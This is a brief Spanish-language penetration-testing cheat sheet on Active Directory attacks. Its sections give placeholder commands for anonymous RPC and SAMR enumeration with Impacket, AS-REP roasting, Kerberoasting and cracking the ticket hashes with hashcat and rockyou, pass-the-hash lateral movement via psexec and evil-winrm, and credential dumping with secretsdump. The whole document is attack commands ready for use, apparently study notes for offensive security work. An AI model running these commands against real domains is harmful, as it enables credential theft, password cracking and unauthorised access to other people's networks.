# 6. Active Directory

**Enumeración con Impacket (desde fuera):**

  impacket-rpcclient -U "" -N <IP>

  impacket-samrdump <DOMAIN>/<USER>:<PASS>@<IP>

  impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <IP>  # AS-REP Roasting

**Kerberoasting:**

  impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request
  
  hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

**Movimiento Lateral y Pass-the-Hash (PtH):**

  impacket-psexec <DOMAIN>/<USER>@<IP> -hashes <LM_HASH>:<NT_HASH>
  
  evil-winrm -i <IP> -u <USER> -H <NT_HASH>

**Dump the credenciales (Si se es Administrador o SYSTEM):**

  impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>

